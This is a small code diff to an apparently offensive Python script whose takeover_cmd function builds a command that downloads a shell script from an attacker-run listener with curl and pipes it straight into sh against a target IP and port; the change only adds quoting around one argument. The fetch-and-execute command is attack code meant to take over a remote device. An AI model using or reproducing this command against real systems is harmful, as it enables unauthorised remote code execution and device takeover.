@@ -7,7 +7,7 @@ import sys
 srv_run = True
 
 def takeover_cmd(listen_ip: str, listen_port: int, target_ip: str, target_port: int, extra: str, www: bool=False) -> str:
-    cmd_str = f"curl http://{listen_ip}:{listen_port}/srv/axis/axis-prep.sh | sh -s -- {listen_ip}:{listen_port} {1 if www else 0} {target_ip} {target_port} {extra}"
+    cmd_str = f"curl http://{listen_ip}:{listen_port}/srv/axis/axis-prep.sh | sh -s -- {listen_ip}:{listen_port} {1 if www else 0} {target_ip} {target_port} '{extra}'"
     # cmd_str = f"ping {listen_ip}"
     return cmd_str
 
